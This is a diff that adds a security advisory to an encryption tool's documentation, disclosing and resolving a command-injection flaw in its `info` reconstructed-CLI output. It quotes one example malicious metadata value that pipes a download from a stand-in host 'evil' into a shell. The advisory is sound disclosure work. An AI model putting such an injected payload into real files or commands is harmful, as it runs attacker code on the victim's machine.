@@ -226,6 +226,21 @@ relevant.
 
 ## Security Advisories
 
+### ADVISORY 2026-26: `info` Reconstructed-CLI Block Interpolated Untrusted Metadata Unquoted — Resolved
+
+**Severity:** Medium · **CWE-78** (OS Command Injection via unsafe output)
+**Affected versions:** all releases with the `info` reconstructed-CLI output, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).
+
+**Summary:** the `info` command prints a "Reconstructed CLI" block (an `openssl_encrypt encrypt …` command that would reproduce a file's settings), built by `_reconstruct_cli_from_metadata`. It interpolated attacker-controlled metadata fields — `pepper_name`, `hsm_plugin`, `algorithm`, `cipher_chain`, `kdf_config.hkdf.info`, `argon2.type`, `randomx.mode`, and the numeric cost fields — into that shell text with no quoting. A file whose `pepper_name` was, e.g., `work; curl -s http://evil/x | sh #` produced a printed command that executed attacker code the moment the user copied the block into a shell (the block's stated purpose); newline/escape injection in the same output could make the malicious suffix inconspicuous.
+
+**Impact:** command execution on the machine running `info` against an untrusted file — but only after the user pastes the reconstructed command into a shell. It is not executed by the tool itself.
+
+**Fixed in 1.4.9:** every value interpolated into the reconstructed command now passes through `shlex.quote()` (via a `_shq()` helper), so a crafted value — including one containing shell metacharacters or embedded newlines — stays a single, inert shell token. Regression-pinned by `test_info_cli_reconstruction_shell_safety_234.py`, which asserts each crafted value survives `shlex.split` as exactly one token.
+
+**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not paste the `info` reconstructed-CLI block for an untrusted file into a shell without inspecting it.
+
+**Disclosure:** tracked as gitlab#234 and GHSA-gw2m-mj6q-59hc (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F35).
+
 ### ADVISORY 2026-25: Pre-Authentication Resource Exhaustion via Unbounded KDF Cost in Crafted Files — Resolved
 
 **Severity:** Medium · **CWE-770** (Allocation of Resources Without Limits) / CWE-405 / CWE-1284
